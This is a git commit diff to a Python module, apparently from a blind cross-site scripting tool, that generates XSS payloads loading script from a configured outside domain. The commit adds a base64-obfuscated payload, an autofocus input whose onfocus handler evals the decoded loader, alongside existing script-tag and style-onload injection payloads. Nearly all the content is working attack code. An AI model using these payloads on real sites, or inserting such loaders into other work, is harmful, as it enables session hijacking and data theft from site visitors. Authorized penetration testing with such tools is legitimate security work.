8fc89188ec6f992383ee2f8d001a936360c99586
Isira Adithya <rp.isira@gmail.com>
2025-02-26 08:17:26 +0530

    Added input b64 payload

--- CLI/modules/payload_generator.py
+++ CLI/modules/payload_generator.py
@@ -1,3 +1,4 @@
+from base64 import b64encode
 from modules.config import Config
 
 class PayloadGenerator:
@@ -10,9 +11,14 @@ class PayloadGenerator:
         if (self.config.domain == ''):
             print(f"Please set the domain in the config file. ({Config().config_location})")
             exit()
+
+        base64Code = f'var a=document.createElement("script");a.src="//{self.config.domain}/";document.body.appendChild(a);'.encode('utf-8')
+        base64Code =b64encode(base64Code).decode('utf-8')
+
         payloads = [
             f'\"\'><script src="//{self.config.domain}/xss.js"></script>',
             f'\"\'><style/onload=import("//{self.config.domain}/xss.js")>',
+            f'\'\"><input on onfocus=eval(atob(this.id)) id={base64Code} autofocus>'
         ]
         self.payloads = payloads
 
